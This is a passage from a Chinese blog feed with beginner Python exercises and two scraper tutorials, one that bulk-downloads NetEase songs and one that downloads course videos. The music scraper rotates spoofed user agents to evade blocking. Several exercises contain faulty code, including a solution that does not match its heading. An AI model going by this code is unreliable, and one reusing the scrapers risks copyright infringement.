title="5.编写程序用户登录程序且仅有三次机会"></a>5.编写程序用户登录程序且仅有三次机会</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"admin"</span>password <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    input_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入用户名："</span><span class="token punctuation">)</span>    input_password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入用户密码"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> input_name <span class="token operator">==</span> name <span class="token keyword">and</span> input_password <span class="token operator">==</span> password<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"登录成功"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"登录失败，请重新输入！"</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"您已经失败三次，无法登录了！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-求阶乘s-x3D-10-即s-x3D-123456789-10-的结果"><a href="#6-求阶乘s-x3D-10-即s-x3D-123456789-10-的结果" class="headerlink" title="6.求阶乘s=10! (即s=123456789*10)的结果"></a>6.求阶乘s=10! (即s=1<em>2</em>3<em>4</em>5<em>6</em>7<em>8</em>9*10)的结果</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 累乘积</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span><span class="token operator">*=</span>i<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'10!为：'</span><span class="token punctuation">,</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-棋盘放麦粒问题"><a href="#7-棋盘放麦粒问题" class="headerlink" title="7.棋盘放麦粒问题"></a>7.棋盘放麦粒问题</h3><p>用米粒填充国际象棋盘：有个很古老的传说，那时候象棋刚刚发明出来，阿拉伯的一个国王一下就迷上了，觉得应该重奖发明这个游戏的人，结果发明者来了，他让人家提要求，人家说棋盘上第一个格放1粒麦子，第二个格2粒，第三格4粒，第四格8粒，这样类推下去，最后一个格也放满（总共有64格），最后把这些麦粒奖给他，国王欣然同意，觉得这个人很厚道，不漫天要价，结果按照这个规律装麦粒的时候才发现，原来全国粮仓里的麦子也不够用。这就是典型的数量级上的错误。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 累加和</span>wheat_number <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment"># 麦粒数量、第一次是一颗</span><span class="token comment"># 循环64次即可</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span><span class="token operator">+=</span>wheat_number    wheat_number<span class="token operator">*=</span><span class="token number">2</span>  <span class="token comment"># 每次麦粒增多为两倍</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'一共装了</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">sum</span><span class="token punctuation">}</span></span><span class="token string">粒麦子'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-百钱买百鸡"><a href="#8-百钱买百鸡" class="headerlink" title="8.百钱买百鸡"></a>8.百钱买百鸡</h3><p>百钱买百鸡，现有100文钱，公鸡5文钱一只，母鸡3文钱一只，小鸡一文钱3只，要求：公鸡，母鸡，小鸡都要有，把100文钱买100只鸡，买的鸡是整数。多少只公鸡，多少只母鸡多少只小鸡？(穷举法应用)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'公鸡\t母鸡\t小鸡'</span><span class="token punctuation">)</span><span class="token keyword">for</span> gj_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> mj_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> xj_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">301</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> gj_num<span class="token operator">*</span><span class="token number">5</span> <span class="token operator">+</span> mj_num<span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> xj_num<span class="token operator">*</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">3</span> <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>gj_num<span class="token punctuation">,</span><span class="token string">'\t'</span><span class="token punctuation">,</span>mj_num<span class="token punctuation">,</span><span class="token string">'\t'</span><span class="token punctuation">,</span>xj_num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-换钞票问题"><a href="#9-换钞票问题" class="headerlink" title="9.换钞票问题"></a>9.换钞票问题</h3><p>将一张100元钞票兑换成面值分别为20元、10元和5元的钞票，要求每种至少有一张，共有多少种不同的换法并输出所有可能的换法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'20元\t10元\t5元'</span><span class="token punctuation">)</span><span class="token keyword">for</span> y20_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y10_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y5_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> y20_num<span class="token operator">*</span><span class="token number">20</span><span class="token operator">+</span>y10_num<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>y5_num<span class="token operator">*</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>y20_num<span class="token punctuation">,</span><span class="token string">'\t'</span><span class="token punctuation">,</span>y10_num<span class="token punctuation">,</span><span class="token string">'\t'</span><span class="token punctuation">,</span>y5_num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-找出10-100之间能被6、9除，余数是3-的所有整数"><a href="#10-找出10-100之间能被6、9除，余数是3-的所有整数" class="headerlink" title="10.找出10~100之间能被6、9除，余数是3 的所有整数"></a>10.找出10~100之间能被6、9除，余数是3 的所有整数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> dm_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> zm_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> xm_num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dm_num<span class="token operator">+</span>zm_num<span class="token operator">+</span>xm_num<span class="token operator">==</span><span class="token number">100</span> <span class="token keyword">and</span> dm_num<span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> zm_num<span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> xm_num<span class="token operator">*</span><span class="token number">0.5</span> <span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>dm_num<span class="token punctuation">,</span>zm_num<span class="token punctuation">,</span>xm_num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-计算水仙花数"><a href="#11-计算水仙花数" class="headerlink" title="11.计算水仙花数"></a>11.计算水仙花数</h3><p>输出100~999之间的“水仙花数”。所谓“水仙花数”，是指该数等于各位数字的立方和，如407=4**3+0**3+7**3</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 遍历100-999</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将i转换成字符串，通过字符串的索引取出个位，十位，百位</span>    <span class="token comment"># 然后再转为回整数，方便后面的运算</span>    i1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    i2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    i3 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i1<span class="token operator">**</span><span class="token number">3</span><span class="token operator">+</span>i2<span class="token operator">**</span><span class="token number">3</span><span class="token operator">+</span>i3<span class="token operator">**</span><span class="token number">3</span><span class="token operator">==</span>i<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫4—网易云歌曲爬虫</title>
      <link href="/2022/03/21/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB4%E2%80%94%E7%BD%91%E6%98%93%E4%BA%91%E6%AD%8C%E6%9B%B2%E7%88%AC%E8%99%AB/"/>
      <url>/2022/03/21/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB4%E2%80%94%E7%BD%91%E6%98%93%E4%BA%91%E6%AD%8C%E6%9B%B2%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token punctuation">,</span>re<span class="token punctuation">,</span>os<span class="token punctuation">,</span>time<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">downloader</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----下载器----#</span>    size<span class="token operator">=</span><span class="token number">0</span> <span class="token comment">#定义已下载文件的大小（byte）</span>    chunk_size<span class="token operator">=</span><span class="token number">1024</span> <span class="token comment">#定义每次下载的数据大小（byte）</span>    root<span class="token operator">=</span><span class="token string">'./蔡徐坤动听音乐/'</span>    path<span class="token operator">=</span>root<span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'.mp3'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 如果文件夹不存在，则创建文件夹</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>            content_size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[文件大小]：%0.2f MB'</span><span class="token operator">%</span><span class="token punctuation">(</span>content_size<span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将byte换算成MB</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"利神超极速爬虫器正在疯狂下载！！！"</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    <span class="token keyword">for</span> data <span class="token keyword">in</span> res<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span>chunk_size<span class="token punctuation">)</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        size<span class="token operator">+=</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[下载进度]:{}{:.2f}%"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>size<span class="token operator">*</span><span class="token number">50</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>size<span class="token operator">*</span><span class="token number">100</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'\n下载成功,文件自动保存在当前目录</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件已存在'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬取失败'</span><span class="token punctuation">)</span><span class="token comment"># 伪装请求头</span>user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span><span class="token punctuation">]</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment"># 爬取歌手页</span>url <span class="token operator">=</span> <span class="token string">'https://music.163.com/artist?id=12932368'</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment">#用正则表达式提取id和歌曲名，&lt;a href="/song?id=1360512113"&gt;记得&lt;/a&gt;</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;a href="/song\?id=(\d+)"&gt;.*?&lt;/a&gt;'</span><span class="token punctuation">)</span>ids<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;a href="/song\?id=\d+"&gt;(.*?)&lt;/a&gt;'</span><span class="token punctuation">)</span>names<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># 批量下载歌曲</span><span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span>name <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>ids<span class="token punctuation">,</span>names<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://music.163.com/song/media/outer/url?id=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>    downloader<span class="token punctuation">(</span>url<span class="token punctuation">,</span>name<span class="token punctuation">)</span>    <span class="token comment"># res=requests.get(url,headers=headers)</span>    <span class="token comment"># file = open(f'{name}.mp3','wb')</span>    <span class="token comment"># file.write(res.content)</span>    <span class="token comment"># file.close()</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'爬虫完毕，不要问谁开发的，深藏功与名，按任意键退出'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫3—爬取umn网站的所有视频</title>
      <link href="/2022/03/20/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB3%E2%80%94%E7%88%AC%E5%8F%96umn%E7%BD%91%E7%AB%99%E7%9A%84%E6%89%80%E6%9C%89%E8%A7%86%E9%A2%91/"/>
      <url>/2022/03/20/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB3%E2%80%94%E7%88%AC%E5%8F%96umn%E7%BD%91%E7%AB%99%E7%9A%84%E6%89%80%E6%9C%89%E8%A7%86%E9%A2%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网站分析"><a href="#一、网站分析" class="headerlink" title="一、网站分析"></a>一、网站分析</h2><p>打开课程详情页，目标是爬取所有的教学视频。<br>在详情页抓包，可以得到前三个视频的链接后缀。<br>第一个视频：1581601804.0237.24958.6125399.mp4<br>第二个视频：1581605929.0875.63457.6129383.mp4<br>第三个视频：1581605996.445.72069.6126469.mp4<br>那这个后缀怎么得到呢，首页的源代码里面是没有的，只能抓包看看，果然发现一个很萌的东西，因为开发者为了让首页加载出封面的图片，而这个图片又是直接从视频截取的，然后顺理成章的，网站开发者为了图方便省事，直接就用了和视频一样的url，只是后缀换成了jpg而已。<br>既然这样就很简单了，渲染出整个页面的数据，然后取出视频的后缀，拼接一下就行了，代码如下。</p><h2 id="二、完整代码"><a href="#二、完整代码" class="headerlink" title="二、完整代码"></a>二、完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#2.1版本公告：从程序目录启动谷歌浏览器驱动</span><span class="token comment">#2.0版本公告：下载内容从网站动态获得</span><span class="token comment">#1.3版本公告：显示已找到多少个资源</span><span class="token comment">#1.2版本公告：加入了文本进度条显示</span><span class="token comment">#1.1版本公告：新增自动创建文件夹功能，文件检索功能，文件已存在时不会重复下载</span><span class="token comment">#umn一键视频爬取器1.0版本介绍：用于爬取umn教学平台上的的教学视频</span><span class="token keyword">import</span> time<span class="token keyword">import</span> pyautogui<span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options<span class="token keyword">def</span> <span class="token function">video_url_get</span><span class="token punctuation">(</span>url_course<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----获取视频的url----#</span>    video_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment">#----设置浏览器静默模式（已停用，否则无法下滑鼠标）----#</span>    chrome_options<span class="token operator">=</span>Options<span class="token punctuation">(</span><span class="token punctuation">)</span>    chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>    diver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">'chromedriver.exe'</span><span class="token punctuation">)</span>    <span class="token comment">#----访问到首页----#  </span>    diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_course<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment">#----鼠标往下滑两次----#</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pyautogui<span class="token punctuation">.</span>scroll<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment">#----获取整个页面的数据，提取出视频后缀----#</span>    Pagesource<span class="token operator">=</span>diver<span class="token punctuation">.</span>page_source    video_tails<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(\d*\.\d*\.\d*.{0,10}).mp4'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>Pagesource<span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> video_tail <span class="token keyword">in</span> video_tails<span class="token punctuation">:</span>        video_url<span class="token operator">=</span><span class="token string">'https://statics0.umustatic.cn/videoweike/teacher/weike/4kXW2806/transcoding/'</span><span class="token operator">+</span>video_tail<span class="token operator">+</span><span class="token string">'.mp4'</span>        video_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>video_url<span class="token punctuation">)</span>    <span class="token keyword">return</span> video_list<span class="token keyword">def</span> <span class="token function">downloader</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----下载器----#</span>    start<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    size<span class="token operator">=</span><span class="token number">0</span> <span class="token comment">#定义已下载文件的大小（byte）</span>    chunk_size<span class="token operator">=</span><span class="token number">1024</span> <span class="token comment">#定义每次下载的数据大小（byte）</span>    root<span class="token operator">=</span><span class="token string">'d://umn_spider_video//'</span>    path<span class="token operator">=</span>root<span class="token operator">+</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>            content_size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[文件大小]：%0.2f MB'</span><span class="token operator">%</span><span class="token punctuation">(</span>content_size<span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将byte换算成MB</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"急速爬虫器正在疯狂下载！！！"</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    <span class="token keyword">for</span> data <span class="token keyword">in</span> res<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span>chunk_size<span class="token punctuation">)</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        size<span class="token operator">+=</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token 